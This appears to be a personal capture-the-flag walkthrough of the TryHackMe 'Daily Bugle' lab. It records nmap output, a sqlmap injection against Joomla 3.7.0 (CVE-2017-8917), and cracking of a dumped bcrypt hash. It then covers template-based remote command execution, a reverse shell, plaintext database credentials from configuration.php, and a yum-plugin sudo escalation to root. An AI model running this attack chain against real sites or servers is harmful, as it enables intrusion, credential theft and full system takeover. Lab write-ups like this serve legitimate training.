@@ -1,0 +1,245 @@
+Daily Bugle
+
+NMAP RESULTS:
+
+Nmap scan report for 10.10.141.15
+Host is up, received reset ttl 63 (0.15s latency).
+Scanned at 2021-05-12 10:33:49 EDT for 54s
+
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
+|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
+80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
+|_http-generator: Joomla! - Open Source Content Management
+| http-methods: 
+|_  Supported Methods: HEAD POST OPTIONS
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+|_http-title: Home
+3306/tcp open  mysql   syn-ack ttl 63 MariaDB (unauthorized)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%), Linux 3.16 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (94%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.91%E=4%D=5/12%OT=22%CT=%CU=44367%PV=Y%DS=2%DC=T%G=N%TM=609BE783%P=x86_64-pc-linux-gnu)
+SEQ(SP=106%GCD=1%ISR=106%TI=Z%II=I%TS=A)
+SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=I%TS=A)
+OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
+WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
+ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)
+T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
+IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 49.709 days (since Tue Mar 23 17:33:29 2021)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   161.73 ms 10.8.0.1
+2   162.45 ms 10.10.141.15
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 10:34
+Completed NSE at 10:34, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 10:34
+Completed NSE at 10:34, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 10:34
+Completed NSE at 10:34, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 56.36 seconds
+           Raw packets sent: 65 (5.402KB) | Rcvd: 266 (256.821KB)
+
+
+JOOMLA VERSION: 3.7.0
+
+
+# Exploit Title: Joomla 3.7.0 - Sql Injection
+# Date: 05-19-2017
+# Exploit Author: Mateus Lino
+# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
+# Vendor Homepage: https://www.joomla.org/
+# Version: = 3.7.0
+# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
+# CVE : - CVE-2017-8917
+
+
+URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
+
+
+Using Sqlmap: 
+
+sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullorder:
+
+
+RESULT:
+=====================
+[11:29:47] [INFO] retrieved: 'jonah'
+Database: joomla
+Table: #__users
+[1 entry]
++-----+------------+---------------------+--------------------------------------------------------------+----------+
+| id  | name       | email               | password                                                     | username |
++-----+------------+---------------------+--------------------------------------------------------------+----------+
+| 811 | Super User | jonah@tryhackme.com | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm | jonah    |
++-----+------------+---------------------+--------------------------------------------------------------+----------+
+
+
+
+# sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+spiderman123     (?)
+1g 0:00:15:10 DONE (2021-05-12 11:45) 0.001098g/s 51.45p/s 51.45c/s 51.45C/s sweetsmile..speciala
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+USING THE JOOMLA ACCOUNT, EDITING THE TEMPLATE PAGE, GOT THE RCE:
+
+http://10.10.141.15/index.php?cmd=ls
+
+LICENSE.txt
+README.txt
+administrator
+bin
+cache
+cli
+components
+configuration.php
+htaccess.txt
+images
+includes
+index.php
+language
+layouts
+libraries
+media
+modules
+plugins
+robots.txt
+templates
+tmp
+web.config.txt
+
+REVERSE SHELL:
+---------------------------
+
+# nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.141.15] 54682
+bash: no job control in this shell
+bash-4.2$ id    
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+bash-4.2$ 
+
+IN CONFIGURATION.PHP FILE:
+------------------------------
+
+public $dbtype = 'mysqli';
+	public $host = 'localhost';
+	public $user = 'root';
+	public $password = 'nv5uz9r3ZEDzVjNu';
+	public $db = 'joomla';
+	public $dbprefix = 'fb9j5_';
+	public $live_site = '';
+	public $secret = 'UAMBRWzHO3oFPmVC';
+	public $gzip = '0';
+	public $error_reporting = 'default';
+	public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
+	public $ftp_host = '127.0.0.1';
+	public $ftp_port = '21';
+	public $ftp_user = '';
+	public $ftp_pass = '';
+
+USING THE PASSWORD:
+---------------------------
+
+sh-4.2$ su jjameson
+Password: 
+[jjameson@dailybugle html]$ 
+
+
+
+[jjameson@dailybugle ~]$ sudo -l 
+Matching Defaults entries for jjameson on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+
+CHECK GTFOBINS:
+========================
+# Spawn interactive root shell by loading a custom plugin.
+
+Code:	TF=$(mktemp -d)
+	cat >$TF/x<<EOF
+	[main]
+	plugins=1
+	pluginpath=$TF
+	pluginconfpath=$TF
+	EOF
+	
+	cat >$TF/y.conf<<EOF
+	[main]
+	enabled=1
+	EOF
+	
+	cat >$TF/y.py<<EOF
+	import os
+	import yum
+	from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+	requires_api_version='2.1'
+	def init_hook(conduit):
+	  os.execl('/bin/sh','/bin/sh')
+	EOF
+	
+	sudo yum -c $TF/x --enableplugin=y
+	
+Type:	sudo
+
+LETS TRY:
+=====================
+
+
+sh-4.2# id
+uid=0(root) gid=0(root) groups=0(root)
+sh-4.2# 
+
+
+IM ROOT
+GOT BOTH FLAGS
+
